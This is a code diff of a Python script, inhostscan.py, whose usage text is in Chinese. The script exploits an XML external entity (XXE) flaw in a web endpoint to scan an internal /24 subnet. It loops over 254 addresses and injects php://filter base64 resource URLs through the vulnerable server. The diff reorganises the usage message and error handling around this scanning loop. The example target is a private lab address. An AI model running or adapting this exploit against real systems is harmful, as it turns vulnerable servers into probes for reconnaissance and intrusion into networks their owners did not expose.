@@ -21,14 +21,15 @@ def XXE(url,ip,string):
 if __name__ == '__main__':
 	headers = {'Content-Type':'application/xml'}
 	try:
+		print('''
+[!] 用法：python3 inhostscan.py 漏洞地址 待扫描的IP段
+[!] 示例：python3 inhostscan.py http://192.168.38.132/xxe_test.php 192.168.38
+									''')
 		url = sys.argv[1]
 		ip_s = sys.argv[2]
+		for i in range(1, 255):
+			ip = ip_s + '.' + str(i)
+			string = 'php://filter/convert.base64-encode/resource=http://' + ip + '/'
+			XXE(url,ip, string)
 	except:
-		print('''
-用法：python3 inhostscan.py 漏洞地址 待扫描的IP段
-示例：python3 inhostscan.py http://192.168.38.132/xxe_test.php 192.168.38
-				''')
-	for i in range(1, 255):
-		ip = ip_s + '.' + str(i)  # 记得修改IP段
-		string = 'php://filter/convert.base64-encode/resource=http://' + ip + '/'
-		XXE(url,ip, string)
+		print('[!] 请检查命令是否有误')
